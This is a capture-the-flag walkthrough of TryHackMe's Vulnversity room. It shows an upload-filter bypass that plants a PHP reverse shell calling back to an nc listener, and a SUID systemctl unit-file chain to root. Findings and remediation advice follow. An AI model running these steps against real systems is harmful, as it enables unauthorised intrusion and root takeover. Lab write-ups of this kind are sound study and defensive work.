# TryHackMe — Vulnversity

**Difficulty:** Easy · **Category:** Web / Linux · **Date:** November 2026
**Author:** [Jbali Aloui](https://github.com/aloui-sec)

> Walkthrough of the *Vulnversity* room. Flags, credentials and target addresses are
> redacted — the value of this write-up is the methodology and the reasoning behind
> each decision.

---

## 1. Scope & Objective

A Linux host exposing a web application on a non-standard port. The objective was to
locate an upload function, bypass its file-type filter, obtain command execution as
the web server user, and escalate to root through a misconfigured privileged binary.

This is a very common real-world chain: **an upload filter that is not a security
control**, followed by **a privileged binary that was never audited**.

---

## 2. Reconnaissance

```bash
nmap -sV -p- -T4 <TARGET>
```

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP | vsftpd 3.0.5 |
| 22   | SSH | OpenSSH 8.2p1 Ubuntu |
| 139  | SMB | Samba smbd 4 |
| 445  | SMB | Samba smbd 4 |
| 3128 | HTTP proxy | Squid 4.10 |
| **3333** | **HTTP** | **Apache httpd 2.4.41 (Ubuntu)** |

**Key lesson:** the web server is on **3333**, not 80. A default scan of the top 1000
ports would still find it, but relying on `http://<target>/` — i.e. assuming port 80 —
wastes the first ten minutes of any engagement. Always let the scan define the URL.

The OS is identified straight from the service banner (`Apache ... (Ubuntu)`), which
narrows the privilege-escalation playbook immediately.

---

## 3. Content Discovery

```bash
gobuster dir -u http://<TARGET>:3333 -w /usr/share/wordlists/dirb/common.txt
```

Results of interest:

```
/images/          (Status: 301)
/css/             (Status: 301)
/fonts/           (Status: 301)
/js/              (Status: 301)
/internal/        (Status: 301)   <-- upload form
index.html        (Status: 200)
server-status     (Status: 403)
```

`/internal/` hosts a file upload form with no authentication in front of it.

**Method note:** the value of directory brute-forcing is not the directories it finds
— it is the ones the application does not link to. Everything linked from
`index.html` was already visible; `/internal/` was found only by guessing names.

---

## 4. The Upload Filter — Bypassing a Blacklist

The form rejected `.php` uploads. That is the entire control: an extension blacklist.

Apache does not map only `.php` to the PHP handler. The default configuration
associates several alternative extensions with the same interpreter — `.phtml`,
`.php3`, `.php4`, `.php5`, `.pht` among them. The application validates the
**extension**, Apache executes the **handler**.

Uploading the same payload renamed to `.phtml` was accepted and executed:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
# edit $ip / $port to the attacker VPN address and a chosen port

# listener
nc -lvnp 1234
```

Then browse to the uploaded file:

```
http://<TARGET>:3333/internal/uploads/shell.phtml
```

Execution returned a shell as `www-data`.

**Why this matters beyond this room:** a blacklist enumerates what is forbidden and
therefore always misses something. A whitelist enumerates what is permitted and
fails closed. Every file-type filter in production should be a whitelist, validated
server-side, with the upload directory stripped of execution rights.

### 4.1 Debugging the reverse shell

The first attempt returned:

```
WARNING: Failed to daemonise. This is quite common and not fatal.
Connection timed out (110)
```

The payload was executing — the failure was in the callback. The `$ip` value had been
set to the **target's** address instead of the **attacker's** VPN address. `lhost` is
where the connection goes, not where it comes from.

A useful habit: distinguish the errors precisely.

| Message | Meaning |
|---|---|
| `Connection timed out` | The address is unreachable / wrong |
| `Connection refused` | Address correct, nothing listening on that port |
| `Failed to daemonise` | Cosmetic warning — always present, not the error |

---

## 5. Privilege Escalation — SUID `systemctl`

A shell as `www-data` is a foothold, not a result. Enumerating SUID binaries:

```bash
find / -user root -perm -4000 -type f 2>/dev/null
```

Among the usual suspects (`passwd`, `sudo`, `mount`, `su`) one entry does not belong:

```
/bin/systemctl
```

`systemctl` is the service manager. It is **designed to run as root** and to read unit
files that specify a command to execute. Granting it SUID means any local user can ask
it to run a command as root.

### 5.1 The exploit

A minimal unit file whose `ExecStart` sets SUID on `bash`:

```ini
[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target
```

Written to `/tmp/x.service`, then registered and started with the SUID binary's full
path:

```bash
printf '[Service]\nType=oneshot\nExecStart=/bin/sh -c "chmod +s /bin/bash"\n[Install]\nWantedBy=multi-user.target\n' > /tmp/x.service
cat /tmp/x.service

/bin/systemctl link /tmp/x.service
/bin/systemctl enable --now /tmp/x.service

ls -l /bin/bash      # -rwsr-sr-x  <- SUID applied
/bin/bash -p
whoami               # root
```

`bash -p` is required: bash normally drops privileges when its effective UID differs
from its real UID. The `-p` flag preserves them.

### 5.2 Why the first attempt failed

Two mistakes, both worth recording:

1. **The unit file was created on the wrong machine.** The `echo` commands were typed
   into the attacker's terminal instead of the reverse shell, so `/tmp/x.service`
   existed locally and not on the target. Verification caught it immediately:
   `cat /tmp/x.service` returned *No such file or directory*.
2. **The shell was `www-data`, not the application user.** `whoami` is the first
   command to run in any new shell — assumptions about identity are expensive.

**General principle:** every command in a foothold runs on the **target**. There is no
"local" place to type it. Verify identity and filesystem state before building a chain
on top of an assumption.

---

## 6. Findings

| # | Finding | Severity |
|---|---------|----------|
| 1 | Unauthenticated file upload accepting executable extensions (`.phtml`, `.php*`) | Critical |
| 2 | File-type validation is a **blacklist** on the `.php` extension only; the Apache handler mapping allows alternatives | Critical |
| 3 | Uploaded files are stored inside the web root and executed by the web server | Critical |
| 4 | `/bin/systemctl` carries the **SUID** bit, allowing any local user to execute commands as root | Critical |
| 5 | Anonymous/unauthenticated access to an internal application directory | High |
| 6 | Legacy plaintext FTP service exposed and unused by the application | Medium |
| 7 | Detailed service banners disclose exact versions and OS distribution | Low |

---

## 7. Remediation

1. **Replace the blacklist with a whitelist.** Validate by extension *and* by content
   type server-side, and rename files on disk — never trust the client-supplied name.
2. **Store uploads outside the web root** and serve them through a handler that forces
   `Content-Disposition: attachment`.
3. **Disable script execution in the upload directory** (`php_admin_flag engine off`,
   or an equivalent directive for whatever runtime is in use).
4. **Remove the SUID bit from `systemctl`** and from every binary that does not
   strictly require it. Audit SUID/SGID monthly:
   `find / -perm -4000 -o -perm -2000` — and alert on any change to that list.
5. **Restrict who can create systemd units.** Unit creation is root-equivalent code
   execution. Use `polkit` policies rather than privileged binaries.
6. **Put the internal application behind authentication.** Directory brute-forcing
   should not be a shortcut to an admin surface.
7. **Suppress version banners** (`ServerTokens Prod`, `ServerSignature Off`).

---

## 8. Lessons

1. **A filter that enumerates bad things is not a filter.** Whitelists fail closed;
   blacklists always miss one alias.
2. **Know what your web server actually executes.** Apache's handler mapping is wider
   than most developers assume.
3. **`whoami` first, always.** Two of the mistakes in this room came from assuming an
   identity instead of checking it.
4. **Verify before building.** `cat` the file, `ls -l` the binary — every stage of a
   privilege-escalation chain has a cheap, non-destructive proof.
5. **SUID on an interactive tool is root.** `systemctl`, `vim`, `find`, `tar` — the
   list lives on GTFOBins and it is not short.
6. **Read failures precisely.** `timed out` and `refused` describe opposite problems,
   and the difference saves an hour.
7. **Machine time is part of the engagement.** Plan the whole chain before starting:
   foothold, shell, escalation and flag collection in one session.

---

## 9. References

- TryHackMe — [Vulnversity](https://tryhackme.com/room/vulnversity)
- GTFOBins — `systemctl`, SUID section — https://gtfobins.github.io/
- Apache HTTP Server — `AddHandler` / `AddType` directive documentation
- OWASP — Unrestricted File Upload

---

<sub>Published as part of a public learning log. All testing was performed against
an authorised lab environment. Flags, credentials and target addresses are omitted.</sub>
